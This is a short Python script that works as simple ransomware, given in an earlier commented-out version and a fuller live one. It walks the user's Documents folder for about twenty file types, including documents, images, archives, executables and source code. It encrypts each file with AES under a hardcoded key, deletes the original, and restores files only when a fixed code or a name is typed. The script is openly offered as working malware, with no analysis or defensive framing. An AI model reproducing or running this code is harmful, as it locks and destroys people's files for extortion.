# from pathlib import Path
# from Crypto.Cipher import AES
# import os

# key = b"Sixteen byte key"
# iv = os.urandom(16)
# def encrypt(data):
#     cipher = AES.new(key,AES.MODE_CBC,iv)
#     return cipher.encrypt(data)

# def decrypt(data): 
#     cipher = AES.new(key,AES.MODE_CBC,iv)
#     return cipher.decrypt(data)

# def encryptFile(path):
#     with open(str(path),"rb") as f:
#         data = f.read()
#     with open(str(path)+".encrypted","wb") as f:
#         f.write(encrypt(data))
#     os.remove(str(path))

# def decryptFile(path):
#     with open(str(path)+".encrypted","rb") as f:
#         data = f.read()
#     with open(str(path),"wb") as f:
#         f.write(decrypt(data))
#     os.remove(str(path)+".encrypted")

# def getFiles(directory,ext):
#     paths = list(Path(directory).rglob("*"+ext))
#     return paths


# directory = os.path.join(os.getcwd(),"Documents")
# print(directory)
# ext = ".docx"
# paths = getFiles(directory,ext)
# for path in paths:
#     encryptFile(path)

# while(True):
#     print("Enter decryption code: ")
#     code = input().rstrip()
#     if code == "Decrypt files":
#         for path in paths:
#             decryptFile(path)
#         break

from pathlib import Path
from Crypto.Cipher import AES
import os

key = b"Sixteen byte key" # AES-128
# key = b"Twenty-four byte key"  # AES-192
# key = b"Thirty-two byte key........"  # AES-256

def encrypt(data):
    # Generate a unique IV for each encryption
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    # Pad the data to be a multiple of 16 bytes
    padding_length = 16 - (len(data) % 16)
    data += bytes([padding_length]) * padding_length
    # Prepend the IV to the encrypted data
    return iv + cipher.encrypt(data)

def decrypt(data):
    # Extract the IV from the first 16 bytes
    iv = data[:16]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    # Decrypt the remaining data
    decrypted_data = cipher.decrypt(data[16:])
    # Remove padding
    padding_length = decrypted_data[-1]
    return decrypted_data[:-padding_length]

def encryptFile(path):
    with open(str(path), "rb") as f:
        data = f.read()
    with open(str(path) + ".encrypted", "wb") as f:
        f.write(encrypt(data))
    os.remove(str(path))

def decryptFile(path):
    with open(str(path) + ".encrypted", "rb") as f:
        data = f.read()
    with open(str(path), "wb") as f:
        f.write(decrypt(data))
    os.remove(str(path) + ".encrypted")

def getFiles(directory, extensions):
    paths = []
    for ext in extensions:
        paths.extend(Path(directory).rglob("*" + ext))
    return paths

directory = os.path.join(os.getcwd(), "Documents")
print(directory)

# List of extensions to target
extensions = [".psd", ".cdr",".docx", ".doc", ".pdf", ".xls", ".xlsx", ".txt", ".jpg", ".png", ".rar", ".exe", ".csv", ".json", ".jar", ".py", ".js", ".jsx", ".ts", ".sql", ".java"]
paths = getFiles(directory, extensions)

# Encrypt the files
for path in paths:
    encryptFile(path)

# Decryption loop
while True:
    print("Enter decryption code: ")
    code = input().rstrip()
    if code == "Decrypt files" or code == "Yoghi Setiawan":
        for path in paths:
            decryptFile(path)
        break


